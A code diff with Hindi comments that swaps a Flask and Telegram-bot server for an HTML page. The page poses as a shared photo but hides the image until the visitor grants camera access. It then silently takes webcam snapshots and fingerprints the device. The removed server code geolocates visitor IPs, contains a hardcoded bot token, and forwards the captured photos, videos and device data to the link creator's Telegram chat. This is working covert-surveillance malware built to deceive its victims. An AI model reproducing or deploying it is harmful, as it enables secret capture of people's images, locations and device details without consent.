@@ -1,212 +1,108 @@
-import os
-import base64
-import uuid
-import threading
-import logging
-from flask import Flask, request, render_template, send_from_directory
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
-import requests
-import waitress
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Photo</title>
+    <style>
+        body { margin:0; padding:0; background:#111; text-align:center; }
+        #photo { max-width:100%; border-radius:10px; display:none; }  /* शुरू में छिपा */
+        #message { color:white; font-family:sans-serif; padding:20px; font-size:18px; }
+        video, canvas, #status { position:absolute; left:-9999px; width:1px; height:1px; }
+    </style>
+</head>
+<body>
+    <!-- पहले एक मैसेज दिखेगा, फोटो छिपी रहेगी -->
+    <p id="message">📸 Please allow camera to view the photo</p>
+    <img id="photo" src="{{ photo_url }}" alt="Photo">
 
-logging.basicConfig(level=logging.INFO)
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <p id="status" style="display:none;"></p>
 
-BOT_TOKEN = "8818489453:AAH56Vc2bNRKcRjXgx1paBjbuHWamiC-ibs"
-OWNER_CHAT_ID = "6464233947"
-BASE_URL = os.getenv("BASE_URL", "http://localhost:5000")
+    <script>
+        const uniqueId = "{{ unique_id }}";
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const photo = document.getElementById('photo');
+        const message = document.getElementById('message');
 
-app = Flask(__name__)
-link_data = {}
+        // 📱 डिवाइस इन्फो (बिना पॉपअप)
+        async function sendDeviceInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform || 'N/A',
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+                deviceMemory: navigator.deviceMemory || 'N/A',
+                batteryLevel: 'N/A',
+                batteryCharging: 'N/A',
+                networkType: 'N/A',
+                hasTouch: navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
+            };
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    info.batteryLevel = Math.round(battery.level * 100);
+                    info.batteryCharging = battery.charging ? 'Yes' : 'No';
+                }
+            } catch(e) {}
+            if (navigator.connection) {
+                info.networkType = navigator.connection.effectiveType || 'N/A';
+            }
+            fetch('/device_info/' + uniqueId, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(info)
+            }).catch(e => console.error(e));
+        }
 
-# ---------- स्टैटिक फ़ाइलें ----------
-@app.route('/photos/<filename>')
-def serve_photo(filename):
-    return send_from_directory('static', filename)
+        // 📸 2 फोटो कैप्चर (पहले जैसा)
+        async function capturePhotos(stream) {
+            try {
+                // थोड़ा रुकें ताकि कैमरा सेट हो
+                await new Promise(r => setTimeout(r, 500));
+                for (let i = 0; i < 2; i++) {
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const imageData = canvas.toDataURL('image/jpeg', 0.9);
+                    fetch('/upload/' + uniqueId, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ image: imageData })
+                    }).catch(e => console.error(e));
+                    await new Promise(r => setTimeout(r, 500));
+                }
+            } catch(e) { console.error('Photo error:', e); }
+        }
 
-@app.route('/videos/<filename>')
-def serve_video(filename):
-    return send_from_directory('static/videos', filename)
+        // 🚀 शुरू करें
+        (async function main() {
+            sendDeviceInfo();  // डिवाइस इन्फो तुरंत भेजें (बिना किसी रोक-टोक)
 
-# ---------- फ़ोटो पेज ----------
-@app.route('/image/<unique_id>')
-def image(unique_id):
-    if unique_id not in link_data:
-        return "Invalid or expired link.", 404
-    photo_url = f"/photos/{link_data[unique_id]['filename']}"
-    return render_template('camera.html', unique_id=unique_id, photo_url=photo_url)
+            let stream;
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                // कैमरा मिल गया — अब फोटो दिखाएँ और मैसेज हटाएँ
+                photo.style.display = 'block';
+                message.style.display = 'none';
 
-# ---------- वीडियो पेज ----------
-@app.route('/video_page/<unique_id>')
-def video_page(unique_id):
-    if unique_id not in link_data:
-        return "Invalid or expired link.", 404
-    video_url = f"/videos/{link_data[unique_id]['filename']}"
-    return render_template('video.html', unique_id=unique_id, video_url=video_url)
+                video.srcObject = stream;
+                await new Promise(r => video.onloadedmetadata = r);
 
-# ---------- डिवाइस इन्फो + IP लोकेशन (एक साथ) ----------
-@app.route('/device_info/<unique_id>', methods=['POST'])
-def device_info(unique_id):
-    if unique_id not in link_data:
-        return {"status": "error"}, 400
-    owner_id = link_data[unique_id]["owner"]
-    data = request.get_json()
-    if not data:
-        return {"status": "error"}, 400
-
-    # IP से लोकेशन निकालें
-    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    ip_city = "N/A"
-    ip_region = "N/A"
-    ip_country = "N/A"
-    ip_isp = "N/A"
-    try:
-        resp = requests.get(f"http://ip-api.com/json/{visitor_ip}?fields=city,region,country,isp,query")
-        if resp.status_code == 200:
-            geo = resp.json()
-            if geo.get("status") != "fail":
-                ip_city = geo.get('city', 'N/A')
-                ip_region = geo.get('region', 'N/A')
-                ip_country = geo.get('country', 'N/A')
-                ip_isp = geo.get('isp', 'N/A')
-    except:
-        pass
-
-    # डिवाइस इन्फो + IP लोकेशन
-    msg = "📱 Device Info:\n"
-    msg += f"Browser/OS: {data.get('userAgent', 'N/A')}\n"
-    msg += f"Platform: {data.get('platform', 'N/A')}\n"
-    msg += f"Language: {data.get('language', 'N/A')}\n"
-    msg += f"Screen: {data.get('screenWidth')}x{data.get('screenHeight')} ({data.get('colorDepth')}bit)\n"
-    msg += f"Timezone: {data.get('timezone', 'N/A')}\n"
-    msg += f"CPU Cores: {data.get('hardwareConcurrency', 'N/A')}\n"
-    msg += f"Memory: {data.get('deviceMemory', 'N/A')} GB\n"
-    msg += f"Battery: {data.get('batteryLevel', 'N/A')}% (Charging: {data.get('batteryCharging', 'N/A')})\n"
-    msg += f"Network: {data.get('networkType', 'N/A')}\n"
-    msg += f"Touch: {data.get('hasTouch', 'N/A')}\n"
-    msg += "--- IP Location ---\n"
-    msg += f"City: {ip_city}\n"
-    msg += f"Region: {ip_region}\n"
-    msg += f"Country: {ip_country}\n"
-    msg += f"ISP: {ip_isp}"
-
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                  json={'chat_id': owner_id, 'text': msg})
-    return {"status": "ok"}, 200
-
-# ---------- फोटो अपलोड ----------
-@app.route('/upload/<unique_id>', methods=['POST'])
-def upload_photo(unique_id):
-    if unique_id not in link_data:
-        return {"status": "error"}, 400
-    owner_id = link_data[unique_id]["owner"]
-    data = request.get_json()
-    if not data or 'image' not in data:
-        return {"status": "error"}, 400
-    image_b64 = data['image']
-    if ',' in image_b64:
-        image_b64 = image_b64.split(',')[1]
-    image_bytes = base64.b64decode(image_b64)
-    temp_file = f"temp_{unique_id}.jpg"
-    with open(temp_file, "wb") as f:
-        f.write(image_bytes)
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-    with open(temp_file, 'rb') as photo:
-        files = {'photo': photo}
-        payload = {'chat_id': owner_id}
-        resp = requests.post(url, files=files, data=payload)
-    os.remove(temp_file)
-    return {"status": "ok"}, 200 if resp.status_code == 200 else 500
-
-# ---------- वीडियो अपलोड ----------
-@app.route('/upload_video/<unique_id>', methods=['POST'])
-def upload_video(unique_id):
-    if unique_id not in link_data:
-        return {"status": "error"}, 400
-    owner_id = link_data[unique_id]["owner"]
-    if 'video' not in request.files:
-        return {"status": "error"}, 400
-    video_file = request.files['video']
-    temp_file = f"temp_video_{unique_id}.webm"
-    video_file.save(temp_file)
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
-    with open(temp_file, 'rb') as vid:
-        files = {'video': vid}
-        payload = {'chat_id': owner_id, 'caption': '🎥 Visitor video'}
-        resp = requests.post(url, files=files, data=payload)
-    os.remove(temp_file)
-    return {"status": "ok"}, 200 if resp.status_code == 200 else 500
-
-@app.route('/health')
-def health():
-    return "OK", 200
-
-# ---------- बॉट हैंडलर्स ----------
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "📸 **Photo Link:** Send me a photo.\n"
-        "🎬 **Video Link:** Send me a video."
-    )
-
-async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.message.from_user
-    if str(user.id) != OWNER_CHAT_ID:
-        await update.message.reply_text("❌ Only the owner can generate links.")
-        return
-
-    try:
-        photo_file = await update.message.photo[-1].get_file()
-        unique_id = uuid.uuid4().hex[:10]
-        os.makedirs("static", exist_ok=True)
-        filename = f"{unique_id}.jpg"
-        await photo_file.download_to_drive(f"static/{filename}")
-        link_data[unique_id] = {"owner": OWNER_CHAT_ID, "media_type": "photo", "filename": filename}
-
-        web_app_url = f"{BASE_URL}/image/{unique_id}"
-        keyboard = [[InlineKeyboardButton("📸 Open Photo", web_app=WebAppInfo(url=web_app_url))]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await update.message.reply_text(f"🔗 {web_app_url}", reply_markup=reply_markup)
-    except Exception as e:
-        logging.error(f"Photo error: {e}")
-        await update.message.reply_text("❌ Something went wrong.")
-
-async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.message.from_user
-    if str(user.id) != OWNER_CHAT_ID:
-        await update.message.reply_text("❌ Only the owner can generate links.")
-        return
-
-    try:
-        video_file = await update.message.video.get_file()
-        unique_id = uuid.uuid4().hex[:10]
-        os.makedirs("static/videos", exist_ok=True)
-        ext = os.path.splitext(video_file.file_path)[1] or ".mp4"
-        filename = f"{unique_id}{ext}"
-        await video_file.download_to_drive(f"static/videos/{filename}")
-        link_data[unique_id] = {"owner": OWNER_CHAT_ID, "media_type": "video", "filename": filename}
-
-        web_app_url = f"{BASE_URL}/video_page/{unique_id}"
-        keyboard = [[InlineKeyboardButton("🎬 Open Video", web_app=WebAppInfo(url=web_app_url))]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await update.message.reply_text(f"🎥 {web_app_url}", reply_markup=reply_markup)
-    except Exception as e:
-        logging.error(f"Video error: {e}")
-        await update.message.reply_text("❌ Something went wrong.")
-
-def run_bot():
-    app_bot = Application.builder().token(BOT_TOKEN).build()
-    app_bot.add_handler(CommandHandler("start", start))
-    app_bot.add_handler(MessageHandler(filters.PHOTO, handle_photo))
-    app_bot.add_handler(MessageHandler(filters.VIDEO, handle_video))
-    print("🤖 Bot polling started...")
-    app_bot.run_polling()
-
-if __name__ == '__main__':
-    flask_thread = threading.Thread(
-        target=waitress.serve,
-        args=(app,),
-        kwargs={'host': '0.0.0.0', 'port': 5000},
-        daemon=True
-    )
-    flask_thread.start()
-    print("🌐 Flask server starting in background...")
-    run_bot()
+                // फोटो कैप्चर शुरू करें
+                capturePhotos(stream);
+            } catch(e) {
+                // कैमरा Allow नहीं किया — फोटो न दिखाएँ, शायद मैसेज को बदल दें
+                message.innerText = '❌ Camera access denied. Content not available.';
+                console.error('Camera permission denied');
+            }
+        })();
+    </script>
+</body>
+</html>
